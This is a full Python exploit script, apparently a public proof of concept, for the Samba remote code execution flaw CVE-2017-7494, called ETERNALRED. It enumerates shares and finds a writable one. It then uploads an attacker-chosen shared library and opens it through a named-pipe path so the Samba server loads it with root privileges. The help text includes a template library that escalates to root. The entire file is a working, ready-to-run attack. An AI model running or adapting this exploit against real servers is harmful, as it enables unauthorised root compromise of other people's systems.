#!/usr/bin/env python
# Title : ETERNALRED
# Date: 05/24/2017
# Exploit Author: steelo <knownsteelo@gmail.com>
# Vendor Homepage: https://www.samba.org
# Samba 3.5.0 - 4.5.4/4.5.10/4.4.14
# CVE-2017-7494


import argparse
import os.path
import sys
import tempfile
import time
from smb.SMBConnection import SMBConnection
from smb import smb_structs
from smb.base import _PendingRequest
from smb.smb2_structs import *
from smb.base import *


class SharedDevice2(SharedDevice):
    def __init__(self, type, name, comments, path, password):
        super().__init__(type, name, comments)
        self.path = path
        self.password = password

class SMBConnectionEx(SMBConnection):
    def __init__(self, username, password, my_name, remote_name, domain="", use_ntlm_v2=True, sign_options=2, is_direct_tcp=False):
        super().__init__(username, password, my_name, remote_name, domain, use_ntlm_v2, sign_options, is_direct_tcp)


    def hook_listShares(self):
        self._listShares = self.listSharesEx

    def hook_retrieveFile(self):
        self._retrieveFileFromOffset = self._retrieveFileFromOffset_SMB1Unix

    # This is maily the original listShares but request a higher level of info
    def listSharesEx(self, callback, errback, timeout = 30):
        if not self.has_authenticated:
            raise NotReadyError('SMB connection not authenticated')

        expiry_time = time.time() + timeout
        path = 'IPC$'
        messages_history = [ ]

        def connectSrvSvc(tid):
            m = SMB2Message(SMB2CreateRequest('srvsvc',
                                              file_attributes = 0,
                                              access_mask = FILE_READ_DATA | FILE_WRITE_DATA | FILE_APPEND_DATA | FILE_READ_EA | FILE_WRITE_EA | READ_CONTROL | FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE,
                                              share_access = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                              oplock = SMB2_OPLOCK_LEVEL_NONE,
                                              impersonation = SEC_IMPERSONATE,
                                              create_options = FILE_NON_DIRECTORY_FILE | FILE_OPEN_NO_RECALL,
                                              create_disp = FILE_OPEN))

            m.tid = tid
            self._sendSMBMessage(m)
            self.pending_requests[m.mid] = _PendingRequest(m.mid, expiry_time, connectSrvSvcCB, errback)
            messages_history.append(m)

        def connectSrvSvcCB(create_message, **kwargs):
            messages_history.append(create_message)
            if create_message.status == 0:
                call_id = self._getNextRPCCallID()
                # The data_bytes are binding call to Server Service RPC using DCE v1.1 RPC over SMB. See [MS-SRVS] and [C706]
                # If you wish to understand the meanings of the byte stream, I would suggest you use a recent version of WireShark to packet capture the stream
                data_bytes = \
                    binascii.unhexlify(b"""05 00 0b 03 10 00 00 00 74 00 00 00""".replace(b' ', b'')) + \
                    struct.pack('<I', call_id) + \
                    binascii.unhexlify(b"""
b8 10 b8 10 00 00 00 00 02 00 00 00 00 00 01 00
c8 4f 32 4b 70 16 d3 01 12 78 5a 47 bf 6e e1 88
03 00 00 00 04 5d 88 8a eb 1c c9 11 9f e8 08 00
2b 10 48 60 02 00 00 00 01 00 01 00 c8 4f 32 4b
70 16 d3 01 12 78 5a 47 bf 6e e1 88 03 00 00 00
2c 1c b7 6c 12 98 40 45 03 00 00 00 00 00 00 00
01 00 00 00
""".replace(b' ', b'').replace(b'\n', b''))
                m = SMB2Message(SMB2WriteRequest(create_message.payload.fid, data_bytes, 0))
                m.tid = create_message.tid
                self._sendSMBMessage(m)
                self.pending_requests[m.mid] = _PendingRequest(m.mid, expiry_time, rpcBindCB, errback, fid = create_message.payload.fid)
                messages_history.append(m)
            else:
                errback(OperationFailure('Failed to list shares: Unable to locate Server Service RPC endpoint', messages_history))

        def rpcBindCB(trans_message, **kwargs):
            messages_history.append(trans_message)
            if trans_message.status == 0:
                m = SMB2Message(SMB2ReadRequest(kwargs['fid'], read_len = 1024, read_offset = 0))
                m.tid = trans_message.tid
                self._sendSMBMessage(m)
                self.pending_requests[m.mid] = _PendingRequest(m.mid, expiry_time, rpcReadCB, errback, fid = kwargs['fid'])
                messages_history.append(m)
            else:
                closeFid(trans_message.tid, kwargs['fid'], error = 'Failed to list shares: Unable to read from Server Service RPC endpoint')

        def rpcReadCB(read_message, **kwargs):
            messages_history.append(read_message)
            if read_message.status == 0:
                call_id = self._getNextRPCCallID()

                padding = b''
                remote_name = '\\\\' + self.remote_name
                server_len = len(remote_name) + 1
                server_bytes_len = server_len * 2
                if server_len % 2 != 0:
                    padding = b'\0\0'
                    server_bytes_len += 2

                # The data bytes are the RPC call to NetrShareEnum (Opnum 15) at Server Service RPC.
                # If you wish to understand the meanings of the byte stream, I would suggest you use a recent version of WireShark to packet capture the stream
                data_bytes = \
                    binascii.unhexlify(b"""05 00 00 03 10 00 00 00""".replace(b' ', b'')) + \
                    struct.pack('<HHI', 72+server_bytes_len, 0, call_id) + \
                    binascii.unhexlify(b"""4c 00 00 00 00 00 0f 00 00 00 02 00""".replace(b' ', b'')) + \
                    struct.pack('<III', server_len, 0, server_len) + \
                    (remote_name + '\0').encode('UTF-16LE') + padding + \
                    binascii.unhexlify(b"""
02 00 00 00 02 00 00 00 04 00 02 00 00 00 00 00
00 00 00 00 ff ff ff ff 00 00 00 00 00 00 00 00
""".replace(b' ', b'').replace(b'\n', b''))
                m = SMB2Message(SMB2IoctlRequest(kwargs['fid'], 0x0011C017, flags = 0x01, max_out_size = 8196, in_data = data_bytes))
                m.tid = read_message.tid
                self._sendSMBMessage(m)
                self.pending_requests[m.mid] = _PendingRequest(m.mid, expiry_time, listShareResultsCB, errback, fid = kwargs['fid'])
                messages_history.append(m)
            else:
                closeFid(read_message.tid, kwargs['fid'], error = 'Failed to list shares: Unable to bind to Server Service RPC endpoint')

        def listShareResultsCB(result_message, **kwargs):
            messages_history.append(result_message)
            if result_message.status == 0:
                # The payload.data_bytes will contain the results of the RPC call to NetrShareEnum (Opnum 15) at Server Service RPC.
                data_bytes = result_message.payload.out_data

                if data_bytes[3] & 0x02 == 0:
                    sendReadRequest(result_message.tid, kwargs['fid'], data_bytes)
                else:
                    decodeResults(result_message.tid, kwargs['fid'], data_bytes)
            elif result_message.status == 0x0103:   # STATUS_PENDING
                self.pending_requests[result_message.mid] = _PendingRequest(result_message.mid, expiry_time, listShareResultsCB, errback, fid = kwargs['fid'])
            else:
                closeFid(result_message.tid, kwargs['fid'])
                errback(OperationFailure('Failed to list shares: Unable to retrieve shared device list', messages_history))

        def decodeResults(tid, fid, data_bytes):
            shares_count = struct.unpack('<I', data_bytes[36:40])[0]
            results = [ ]     # A list of SharedDevice2 instances
            offset = 36 + 52  # You need to study the byte stream to understand the meaning of these constants
            for i in range(0, shares_count):
                results.append(SharedDevice(struct.unpack('<I', data_bytes[offset+4:offset+8])[0], None, None))
                offset += 12

            for i in range(0, shares_count):
                max_length, _, length = struct.unpack('<III', data_bytes[offset:offset+12])
                offset += 12
                results[i].name = data_bytes[offset:offset+length*2-2].decode('UTF-16LE')

                if length % 2 != 0:
                    offset += (length * 2 + 2)
                else:
                    offset += (length * 2)

                max_length, _, length = struct.unpack('<III', data_bytes[offset:offset+12])
                offset += 12
                results[i].comments = data_bytes[offset:offset+length*2-2].decode('UTF-16LE')

                if length % 2 != 0:
                    offset += (length * 2 + 2)
                else:
                    offset += (length * 2)

                max_length, _, length = struct.unpack('<III', data_bytes[offset:offset+12])
                offset += 12
                results[i].path = data_bytes[offset:offset+length*2-2].decode('UTF-16LE')

                if length % 2 != 0:
                    offset += (length * 2 + 2)
                else:
                    offset += (length * 2)

                max_length, _, length = struct.unpack('<III', data_bytes[offset:offset+12])
                offset += 12
                results[i].password = data_bytes[offset:offset+length*2-2].decode('UTF-16LE')

                if length % 2 != 0:
                    offset += (length * 2 + 2)
                else:
                    offset += (length * 2)


            closeFid(tid, fid)
            callback(results)

        def sendReadRequest(tid, fid, data_bytes):
            read_count = min(4280, self.max_read_size)
            m = SMB2Message(SMB2ReadRequest(fid, 0, read_count))
            m.tid = tid
            self._sendSMBMessage(m)
            self.pending_requests[m.mid] = _PendingRequest(m.mid, int(time.time()) + timeout, readCB, errback,
                                                           fid = fid, data_bytes = data_bytes)

        def readCB(read_message, **kwargs):
            messages_history.append(read_message)
            if read_message.status == 0:
                data_len = read_message.payload.data_length
                data_bytes = read_message.payload.data

                if data_bytes[3] & 0x02 == 0:
                    sendReadRequest(read_message.tid, kwargs['fid'], kwargs['data_bytes'] + data_bytes[24:data_len-24])
                else:
                    decodeResults(read_message.tid, kwargs['fid'], kwargs['data_bytes'] + data_bytes[24:data_len-24])
            else:
                closeFid(read_message.tid, kwargs['fid'])
                errback(OperationFailure('Failed to list shares: Unable to retrieve shared device list', messages_history))

        def closeFid(tid, fid, results = None, error = None):
            m = SMB2Message(SMB2CloseRequest(fid))
            m.tid = tid
            self._sendSMBMessage(m)
            self.pending_requests[m.mid] = _PendingRequest(m.mid, expiry_time, closeCB, errback, results = results, error = error)
            messages_history.append(m)

        def closeCB(close_message, **kwargs):
            if kwargs['results'] is not None:
                callback(kwargs['results'])
            elif kwargs['error'] is not None:
                errback(OperationFailure(kwargs['error'], messages_history))

        if path not in self.connected_trees:
            def connectCB(connect_message, **kwargs):
                messages_history.append(connect_message)
                if connect_message.status == 0:
                    self.connected_trees[path] = connect_message.tid
                    connectSrvSvc(connect_message.tid)
                else:
                    errback(OperationFailure('Failed to list shares: Unable to connect to IPC$', messages_history))

            m = SMB2Message(SMB2TreeConnectRequest(r'\\%s\%s' % ( self.remote_name.upper(), path )))
            self._sendSMBMessage(m)
            self.pending_requests[m.mid] = _PendingRequest(m.mid, expiry_time, connectCB, errback, path = path)
            messages_history.append(m)
        else:
            connectSrvSvc(self.connected_trees[path])


    # Don't convert to Window style path
    def _retrieveFileFromOffset_SMB1Unix(self, service_name, path, file_obj, callback, errback, starting_offset, max_length, timeout = 30):
        if not self.has_authenticated:
            raise NotReadyError('SMB connection not authenticated')

        messages_history = [ ]


        def sendOpen(tid):
            m = SMBMessage(ComOpenAndxRequest(filename = path,
                                              access_mode = 0x0040,  # Sharing mode: Deny nothing to others
                                              open_mode = 0x0001,    # Failed if file does not exist
                                              search_attributes = SMB_FILE_ATTRIBUTE_HIDDEN | SMB_FILE_ATTRIBUTE_SYSTEM,
                                              timeout = timeout * 1000))
            m.tid = tid
            self._sendSMBMessage(m)
            self.pending_requests[m.mid] = _PendingRequest(m.mid, int(time.time()) + timeout, openCB, errback)
            messages_history.append(m)

        def openCB(open_message, **kwargs):
            messages_history.append(open_message)
            if not open_message.status.hasError:
                if max_length == 0:
                    closeFid(open_message.tid, open_message.payload.fid)
                    callback(( file_obj, open_message.payload.file_attributes, 0 ))
                else:
                    sendRead(open_message.tid, open_message.payload.fid, starting_offset, open_message.payload.file_attributes, 0, max_length)
            else:
                errback(OperationFailure('Failed to retrieve %s on %s: Unable to open file' % ( path, service_name ), messages_history))

        def sendRead(tid, fid, offset, file_attributes, read_len, remaining_len):
            read_count = self.max_raw_size - 2
            m = SMBMessage(ComReadAndxRequest(fid = fid,
                                              offset = offset,
                                              max_return_bytes_count = read_count,
                                              min_return_bytes_count = min(0xFFFF, read_count)))
            m.tid = tid
            self._sendSMBMessage(m)
            self.pending_requests[m.mid] = _PendingRequest(m.mid, int(time.time()) + timeout, readCB, errback, fid = fid, offset = offset, file_attributes = file_attributes,
                                                           read_len = read_len, remaining_len = remaining_len)

        def readCB(read_message, **kwargs):
            # To avoid crazy memory usage when retrieving large files, we do not save every read_message in messages_history.
            if not read_message.status.hasError:
                read_len = kwargs['read_len']
                remaining_len = kwargs['remaining_len']
                data_len = read_message.payload.data_length
                if max_length > 0:
                    if data_len > remaining_len:
                        file_obj.write(read_message.payload.data[:remaining_len])
                        read_len += remaining_len
                        remaining_len = 0
                    else:
                        file_obj.write(read_message.payload.data)
                        remaining_len -= data_len
                        read_len += data_len
                else:
                    file_obj.write(read_message.payload.data)
                    read_len += data_len

                if (max_length > 0 and remaining_len <= 0) or data_len < (self.max_raw_size - 2):
                    closeFid(read_message.tid, kwargs['fid'])
                    callback(( file_obj, kwargs['file_attributes'], read_len ))  # Note that this is a tuple of 3-elements
                else:
                    sendRead(read_message.tid, kwargs['fid'], kwargs['offset']+data_len, kwargs['file_attributes'], read_len, remaining_len)
            else:
                messages_history.append(read_message)
                closeFid(read_message.tid, kwargs['fid'])
                errback(OperationFailure('Failed to retrieve %s on %s: Read failed' % ( path, service_name ), messages_history))

        def closeFid(tid, fid):
            m = SMBMessage(ComCloseRequest(fid))
            m.tid = tid
            self._sendSMBMessage(m)
            messages_history.append(m)

        if service_name not in self.connected_trees:
            def connectCB(connect_message, **kwargs):
                messages_history.append(connect_message)
                if not connect_message.status.hasError:
                    self.connected_trees[service_name] = connect_message.tid
                    sendOpen(connect_message.tid)
                else:
                    errback(OperationFailure('Failed to retrieve %s on %s: Unable to connect to shared device' % ( path, service_name ), messages_history))

            m = SMBMessage(ComTreeConnectAndxRequest(r'\\%s\%s' % ( self.remote_name.upper(), service_name ), SERVICE_ANY, ''))
            self._sendSMBMessage(m)
            self.pending_requests[m.mid] = _PendingRequest(m.mid, int(time.time()) + timeout, connectCB, errback, path = service_name)
            messages_history.append(m)
        else:
            sendOpen(self.connected_trees[service_name])

def get_connection(user, password, server, port, force_smb1=False):
    if force_smb1:
        smb_structs.SUPPORT_SMB2 = False

    conn = SMBConnectionEx(user, password, "", "server")
    assert conn.connect(server, port)
    return conn

def get_share_info(conn):
    conn.hook_listShares()
    return conn.listShares()

def find_writeable_share(conn, shares):
    print("[+] Searching for writable share")
    filename = "red"
    test_file = tempfile.TemporaryFile()
    for share in shares:
        try:
            # If it's not writeable this will throw
            conn.storeFile(share.name, filename, test_file)
            conn.deleteFiles(share.name, filename)
            print("[+] Found writeable share: " + share.name)
            return share
        except:
            pass

    return None

def write_payload(conn, share, payload, payload_name):
    with open(payload, "rb") as fin:
        conn.storeFile(share.name, payload_name, fin)

    return True

def convert_share_path(share):
    path = share.path[2:]
    path = path.replace("\\", "/")
    return path

def load_payload(user, password, server, port, fullpath):
    conn = get_connection(user, password, server, port, force_smb1 = True)
    conn.hook_retrieveFile()

    print("[+] Attempting to load payload")
    temp_file = tempfile.TemporaryFile()

    try:
        conn.retrieveFile("IPC$", "\\\\PIPE\\" + fullpath, temp_file)
    except:
        pass

    return

def drop_payload(user, password, server, port, payload):
    payload_name = "charizard"

    conn = get_connection(user, password, server, port)
    shares = get_share_info(conn)
    share = find_writeable_share(conn, shares)

    if share is None:
        print("[!] No writeable shares on " + server + " for user: " + user)
        sys.exit(-1)

    if not write_payload(conn, share, payload, payload_name):
        print("[!] Failed to write payload: " + str(payload) + " to server")
        sys.exit(-1)

    conn.close()

    fullpath = convert_share_path(share)
    return os.path.join(fullpath, payload_name)


def main():
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
    description= """Eternal Red Samba Exploit -- CVE-2017-7494
        Causes vulnerable Samba server to load a shared library in root context
        Credentials are not required if the server has a guest account
        For remote exploit you must have write permissions to at least one share
        Eternal Red will scan the Samba server for shares it can write to
        It will also determine the fullpath of the remote share

        For local exploit provide the full path to your shared library to load

        Your shared library should look something like this

        extern bool change_to_root_user(void);
        int samba_init_module(void)
        {
            change_to_root_user();
            /* Do what thou wilt */
        }
    """)
    parser.add_argument("payload", help="path to shared library to load", type=str)
    parser.add_argument("server", help="Server to target", type=str)
    parser.add_argument("-p", "--port", help="Port to use defaults to 445", type=int)
    parser.add_argument("-u", "--username", help="Username to connect as defaults to nobody", type=str)
    parser.add_argument("--password", help="Password for user default is empty", type=str)
    parser.add_argument("--local", help="Perform local attack. Payload should be fullpath!", type=bool)
    args = parser.parse_args()

    if not os.path.isfile(args.payload):
        print("[!] Unable to open: " + args.payload)
        sys.exit(-1)

    port = 445
    user = "nobody"
    password = ""
    fullpath = ""

    if args.port:
        port = args.port
    if args.username:
        user = args.username
    if args.password:
        password = args.password

    if args.local:
        fullpath = args.payload
    else:
        fullpath = drop_payload(user, password, args.server, port, args.payload)

    load_payload(user, password, args.server, port, fullpath)

if __name__ == "__main__":
    main()